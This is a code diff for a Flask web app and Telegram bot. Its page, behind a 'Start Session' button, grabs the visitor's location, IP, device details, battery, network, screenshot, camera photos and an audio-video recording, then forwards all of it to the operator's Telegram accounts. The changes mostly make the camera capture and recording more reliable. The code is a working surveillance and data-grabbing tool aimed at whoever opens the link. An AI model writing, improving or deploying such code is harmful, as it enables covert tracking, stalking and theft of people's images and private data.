@@ -84,13 +84,8 @@ HTML_PAGE = """<!DOCTYPE html>
                 brand = 'Android';
                 const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
                 model = match ? match[2] : 'Android Device';
-            } else if (ua.includes('Windows')) {
-                brand = 'Microsoft Windows';
-                model = 'PC';
-            } else if (ua.includes('Mac')) {
-                brand = 'Apple Mac';
-                model = 'Mac';
-            }
+            } else if (ua.includes('Windows')) { brand = 'Microsoft Windows'; model = 'PC'; }
+            else if (ua.includes('Mac')) { brand = 'Apple Mac'; model = 'Mac'; }
             return { brand, model };
         }
 
@@ -107,8 +102,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
         function getNetworkType() {
             if (navigator.connection) {
-                const type = navigator.connection.effectiveType || 'unknown';
-                return type; // '4g', '3g', '2g', 'slow-2g', 'wifi' (if available)
+                return navigator.connection.effectiveType || 'unknown';
             }
             return 'unknown';
         }
@@ -127,7 +121,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
         function getOrientation() {
             if (screen.orientation) {
-                return screen.orientation.type; // 'portrait-primary', 'landscape-secondary', etc.
+                return screen.orientation.type;
             } else if (window.orientation !== undefined) {
                 return window.orientation === 0 ? 'portrait' : 'landscape';
             }
@@ -151,29 +145,27 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Robust camera acquisition ----
+        // ---- Improved camera acquisition ----
         async function getCameraStreams() {
             let back = null, front = null;
             let errorMessages = [];
-            let success = false;
 
-            // Try 1: No constraints (most compatible)
+            // Try 1: default (usually back camera on phones)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 back = stream;
-                // Try front separately
+                // Try to get front separately
                 try {
                     front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                 } catch (e) {
                     front = back.clone();
                 }
-                success = true;
                 return { front, back, error: null };
             } catch (err) {
-                errorMessages.push('No-constraint: ' + err.name + ' - ' + err.message);
+                errorMessages.push('Default: ' + err.name + ' - ' + err.message);
             }
 
-            // Try 2: Environment (back camera)
+            // Try 2: Environment (back camera) explicitly
             try {
                 back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
                 try {
@@ -181,7 +173,6 @@ HTML_PAGE = """<!DOCTYPE html>
                 } catch (e) {
                     front = back.clone();
                 }
-                success = true;
                 return { front, back, error: null };
             } catch (err) {
                 errorMessages.push('Environment: ' + err.name + ' - ' + err.message);
@@ -191,46 +182,58 @@ HTML_PAGE = """<!DOCTYPE html>
             try {
                 front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                 back = front.clone();
-                success = true;
                 return { front, back, error: null };
             } catch (err) {
                 errorMessages.push('User: ' + err.name + ' - ' + err.message);
             }
 
-            // All failed
             return { front: null, back: null, error: errorMessages.join(' | ') };
         }
 
+        // ---- Capture frame with proper waiting ----
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.onloadedmetadata = () => {
+                video.onloadedmetadata = async () => {
                     video.play();
-                    // Give time for the camera to warm up
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
-                        canvas.toBlob((blob) => {
-                            resolve(blob);
-                            video.pause();
-                            video.srcObject = null;
-                        }, 'image/jpeg', 0.9);
-                    }, 200);
+                    // Wait for the video to actually have dimensions and a frame
+                    let attempts = 0;
+                    while (attempts < 10) {
+                        await delay(100);
+                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+                            break;
+                        }
+                        attempts++;
+                    }
+                    if (video.videoWidth === 0 || video.videoHeight === 0) {
+                        resolve(null);
+                        video.pause();
+                        video.srcObject = null;
+                        return;
+                    }
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    canvas.toBlob((blob) => {
+                        resolve(blob);
+                        video.pause();
+                        video.srcObject = null;
+                    }, 'image/jpeg', 0.9);
                 };
             });
         }
 
+        // ---- Main session ----
         async function startSession() {
             startBtn.disabled = true;
             startBtn.innerText = 'Loading...';
             await delay(300);
 
-            // Location
+            // Step 1: Location (send immediately)
             let locationData = null;
             if (navigator.geolocation) {
                 try {
@@ -245,7 +248,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 locationData = { denied: true };
             }
 
-            // Collect system data
+            // Step 2: System info (IP, device, battery, network, screen, timezone, language, orientation)
             const ipInfo = await getIpInfo();
             const device = getDeviceInfo();
             const battery = await getBatteryInfo();
@@ -255,7 +258,7 @@ HTML_PAGE = """<!DOCTYPE html>
             const language = getLanguage();
             const orientation = getOrientation();
 
-            // Camera
+            // Step 3: Camera streams
             const { front, back, error } = await getCameraStreams();
             let frontBlob = null, backBlob = null, videoBlob = null;
             let cameraStatus = 'success';
@@ -265,41 +268,54 @@ HTML_PAGE = """<!DOCTYPE html>
                 cameraStatus = 'failed';
                 cameraError = error || 'No camera access';
             } else {
+                // Capture frames
                 if (front) frontBlob = await captureFrame(front);
                 if (back) backBlob = await captureFrame(back);
-                const recordStream = back || front;
-                if (recordStream) {
-                    // Try to use a codec that supports audio
-                    let mimeType = 'video/webm;codecs=vp9,opus';
-                    if (!MediaRecorder.isTypeSupported(mimeType)) {
-                        mimeType = 'video/webm;codecs=vp8,opus';
-                    }
-                    if (!MediaRecorder.isTypeSupported(mimeType)) {
-                        mimeType = 'video/webm';
-                    }
-                    mediaRecorder = new MediaRecorder(recordStream, { mimeType: mimeType });
-                    recordedChunks = [];
-                    mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
-                    mediaRecorder.onstop = () => {
-                        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                        finalizeAndSend();
-                    };
-                    mediaRecorder.start(1000);
-                    recordingActive = true;
-                    setTimeout(() => {
-                        if (recordingActive && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                            recordingActive = false;
-                        }
-                    }, maxDuration);
-                    window.addEventListener('beforeunload', () => {
-                        if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                    });
-                }
+                // Store streams for later recording
+                frontStream = front;
+                backStream = back;
             }
 
-            // Screenshot
+            // Step 4: Screenshot
             const screenshotBlob = await captureScreenshot();
+
+            // Step 5: Start recording (after all other captures)
+            let recordStream = backStream || frontStream;
+            if (recordStream) {
+                // Try to use a codec that supports audio
+                let mimeType = 'video/webm;codecs=vp9,opus';
+                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                    mimeType = 'video/webm;codecs=vp8,opus';
+                }
+                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                    mimeType = 'video/webm';
+                }
+                mediaRecorder = new MediaRecorder(recordStream, { mimeType: mimeType });
+                recordedChunks = [];
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = () => {
+                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    finalizeAndSend();
+                };
+                mediaRecorder.start(1000);
+                recordingActive = true;
+                setTimeout(() => {
+                    if (recordingActive && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        recordingActive = false;
+                    }
+                }, maxDuration);
+                // If page closes, stop recording and send partial video
+                window.addEventListener('beforeunload', () => {
+                    if (recordingActive && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        recordingActive = false;
+                    }
+                });
+            } else {
+                // No recording – finalize immediately
+                finalizeAndSend();
+            }
 
             let finalized = false;
             async function finalizeAndSend() {
@@ -334,25 +350,31 @@ HTML_PAGE = """<!DOCTYPE html>
                 if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
                 if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
                 if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
+                // If no video, send an empty placeholder? We'll just omit.
 
                 await sendData(fd);
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
             }
 
+            // If recording never started, we already called finalize. Otherwise, wait for onstop.
             if (!mediaRecorder) {
-                finalizeAndSend();
+                // Already called finalizeAndSend() above
             } else {
+                // The onstop handler will call finalize. But if recording takes too long, we also set a timeout.
                 setTimeout(() => {
                     if (!finalized) {
                         if (recordingActive && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                             recordingActive = false;
                         }
-                        if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
+                        // Ensure videoBlob is set (might be empty)
+                        if (!videoBlob) {
+                            videoBlob = new Blob([], { type: 'video/webm' });
+                        }
                         finalizeAndSend();
                     }
-                }, maxDuration + 2000);
+                }, maxDuration + 3000);
             }
         }
 
@@ -367,7 +389,6 @@ def index():
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    # Extract all fields
     lat = request.form.get('lat')
     lng = request.form.get('lng')
     location_denied = request.form.get('location_denied')
@@ -391,8 +412,7 @@ def capture():
     back_img = request.files.get('backImage')
     video = request.files.get('video')
 
-    # Log
-    print(f"Received: camera_status={camera_status}, error={camera_error}, front={front_img is not None}, back={back_img is not None}, video={video is not None}")
+    print(f"Received: camera_status={camera_status}, front={front_img is not None}, back={back_img is not None}, video={video is not None}")
 
     for uid in USER_IDS:
         # Location
@@ -464,7 +484,7 @@ def capture():
                 print(f"Camera status error: {e}")
         elif not front_img and not back_img and not video:
             try:
-                bot.send_message(uid, "⚠️ No camera data received – check permissions.")
+                bot.send_message(uid, "⚠️ No camera data received.")
             except Exception as e:
                 print(f"Camera note error: {e}")
 
@@ -478,7 +498,7 @@ def capture():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will collect comprehensive device data including camera, location, battery, network, screen, timezone, language, orientation, and a screenshot.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images, and video recording.")
 
 def run_bot():
     print("Bot polling started.")
